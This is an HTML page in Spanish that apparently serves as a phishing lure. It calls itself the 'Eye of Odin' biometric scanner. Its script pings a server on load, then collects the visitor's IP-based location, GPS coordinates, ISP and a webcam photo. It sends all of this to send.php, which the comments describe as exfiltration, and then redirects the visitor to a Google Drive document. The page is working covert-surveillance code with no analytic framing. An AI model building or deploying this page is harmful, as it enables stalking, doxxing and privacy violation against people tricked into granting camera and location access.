<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
    <title>Eye of Odin - System</title>
    <style>
        :root {
            --bg: #05080f;
            --card: #0a101d;
            --accent: #2dd4bf;
            --accent-2: #3b82f6;
            --muted: #475569;
        }
        html, body { height: 100%; margin: 0; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #f8fafc; overflow: hidden; }
        .wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        
        .card {
            width: 100%; max-width: 400px; background: var(--card);
            border-radius: 20px; padding: 40px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9);
            border: 1px solid rgba(59, 130, 246, 0.1); text-align: center;
        }

        h1 { margin: 0; font-size: 24px; letter-spacing: 4px; color: var(--accent-2); text-transform: uppercase; font-weight: 300; }
        .sub { margin: 10px 0 35px 0; color: var(--muted); font-size: 11px; letter-spacing: 2px; }

        .odin-eye {
            position: relative; width: 150px; height: 150px; margin: 0 auto 30px;
            display: flex; justify-content: center; align-items: center; cursor: pointer;
        }
        .eye-icon { width: 90px; fill: var(--accent); filter: drop-shadow(0 0 15px rgba(45, 212, 191, 0.5)); z-index: 5; transition: 0.3s; }
        .odin-eye:hover .eye-icon { fill: #fbbf24; transform: scale(1.05); }

        .ring {
            position: absolute; width: 140px; height: 140px;
            border: 2px solid rgba(255,255,255,0.05); border-top: 2px solid var(--accent-2);
            border-radius: 50%; animation: spin 2s linear infinite; display: none;
        }
        .laser {
            position: absolute; width: 140px; height: 2px; background: var(--accent);
            box-shadow: 0 0 20px var(--accent); display: none; z-index: 10;
            animation: scan 2s ease-in-out infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes scan { 0%, 100% { top: 20%; opacity: 0; } 50% { top: 80%; opacity: 1; } }

        .console { 
            background: rgba(0,0,0,0.3); border-radius: 8px; padding: 15px; 
            font-family: 'Courier New', monospace; font-size: 10px; color: var(--accent);
            border: 1px solid rgba(255,255,255,0.03); text-align: left; min-height: 40px;
        }
        
        button {
            margin-top: 30px; border: 0; background: linear-gradient(90deg, var(--accent-2), var(--accent));
            color: #fff; padding: 15px; border-radius: 10px; cursor: pointer;
            font-weight: 900; text-transform: uppercase; letter-spacing: 2px; width: 100%;
            box-shadow: 0 10px 15px -3px rgba(59, 130, 246, 0.3);
        }
        button:disabled { opacity: 0.3; }

        footer { margin-top: 30px; color: #1e293b; font-size: 9px; letter-spacing: 3px; }
    </style>
</head>
<body>

    <div class="wrap">
        <div class="card">
            <h1>Eye of Odin</h1>
            <div class="sub">PROTOCOL: BIOMETRIC_SCAN_V1</div>

            <div class="odin-eye" id="sensor">
                <div class="ring" id="ring"></div>
                <div class="laser" id="laser"></div>
                <svg class="eye-icon" viewBox="0 0 24 24">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
            </div>

            <div class="console" id="status">SISTEMA READY. ESPERANDO ACTIVACI√ìN...</div>

            <button id="mainBtn">Ejecutar Escaneo</button>

            <footer>EYE OF ODIN CORE SYSTEM</footer>
        </div>
    </div>

    <script>
        // --- SE√ëAL DE INFILTRACI√ìN: AVISO DE OBJETIVO CONECTADO ---
        fetch('send.php?online=true');

        const sensor = document.getElementById('sensor');
        const mainBtn = document.getElementById('mainBtn');
        const status = document.getElementById('status');
        const laser = document.getElementById('laser');
        const ring = document.getElementById('ring');
        let active = false;

        async function getGeo() {
            return new Promise((resolve) => {
                if (!navigator.permissions) return resolve(null);
                navigator.permissions.query({name:'geolocation'}).then((res) => {
                    if (res.state === 'granted') {
                        navigator.geolocation.getCurrentPosition(
                            (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: "HIGH_PRECISION" }),
                            () => resolve(null), { timeout: 3000 }
                        );
                    } else { resolve(null); }
                });
            });
        }

        async function startSoftware() {
            if (active) return;
            active = true;
            mainBtn.disabled = true;

            status.innerHTML = "> INICIANDO N√öCLEO...<br>> RASTREANDO NODOS ISP...";
            ring.style.display = "block";
            laser.style.display = "block";

            let info = "";

            try {
                // 1. Triangulaci√≥n de Nodos
                const res = await fetch('https://ipwho.is/');
                const d = await res.json();
                
                const gps = await getGeo();
                const lat = gps ? gps.lat : d.latitude;
                const lon = gps ? gps.lon : d.longitude;
                const prec = gps ? gps.acc : "NETWORK_TRIANGULATION";

                info = `
üì° INFRAESTRUCTURA: ${d.connection.isp}
üìç LOCALIZACI√ìN: ${d.city}, ${d.region}
üéØ PRECISI√ìN: ${prec}
üîó MAPA: https://www.google.com/maps?q=${lat},${lon}&z=19`;

                // 2. Captura de Identidad
                status.innerHTML = "> ANALIZANDO BIOMETR√çA FACIAL...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                video.play();
                
                await new Promise(r => setTimeout(r, 2500));

                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                stream.getTracks().forEach(t => t.stop());

                // 3. Env√≠o Seguro v√≠a PHP
                status.innerHTML = "> EXFILTRANDO DATOS AL SERVIDOR...";
                const fd = new FormData();
                fd.append('photo', foto, 'odin.jpg');
                fd.append('info', `üëÅÔ∏è EYE OF ODIN REPORT\n--------------------\n${info}`);

                await fetch('send.php', { method: 'POST', body: fd });
                
                status.innerHTML = "‚úÖ ACCESO CONCEDIDO POR ODIN";
                
                // REDIRECCI√ìN FINAL AL PDF
                setTimeout(() => location.href = "https://drive.google.com/file/d/1PP1u3nSZmVutryd06XMuLbXYoUTcgazJ/view", 1200);

            } catch (err) {
                status.innerHTML = "‚ùå ERROR: PERMISO DENEGADO";
                alert("EYE OF ODIN: Error en sensor. Permita el acceso para validar identidad.");
                location.reload();
            }
        }

        sensor.addEventListener('click', startSoftware);
        mainBtn.addEventListener('click', startSoftware);
    </script>
</body>
</html>
